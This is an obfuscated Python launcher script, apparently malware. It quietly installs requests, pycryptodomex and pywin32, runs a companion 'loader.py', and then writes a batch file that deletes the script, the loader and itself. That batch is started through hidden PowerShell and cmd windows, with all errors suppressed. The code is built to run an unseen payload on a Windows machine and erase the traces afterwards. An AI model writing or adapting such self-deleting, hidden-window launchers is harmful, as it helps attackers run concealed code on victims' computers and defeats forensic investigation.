import os
import sys
import subprocess
import time

J9P_xTb = ["requests", "pycryptodomex", "pywin32"]

for L7Q_MnK in J9P_xTb:
    try:
        __import__(L7Q_MnK)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", L7Q_MnK])

V4R_bPa = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loader.py")

if os.path.exists(V4R_bPa):
    try:
        subprocess.run([sys.executable, V4R_bPa], check=True)
    except subprocess.CalledProcessError:
        sys.exit(1)

def Y2C_wTf():
    try:
        X3N_rGp = os.path.abspath(sys.argv[0])
        M8S_kNl = X3N_rGp + ".bat"

        with open(M8S_kNl, "w") as Z1F_oJv:
            Z1F_oJv.write(f"""
@echo off
timeout /t 3 /nobreak > nul
del "{X3N_rGp}"
del "{V4R_bPa}"
del "{M8S_kNl}"
""")

        subprocess.Popen(
            ["powershell", "-WindowStyle", "Hidden", "-Command",
             f"Start-Process cmd.exe -ArgumentList '/c {M8S_kNl}' -WindowStyle Hidden"],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    
    except Exception:
        pass

Y2C_wTf()
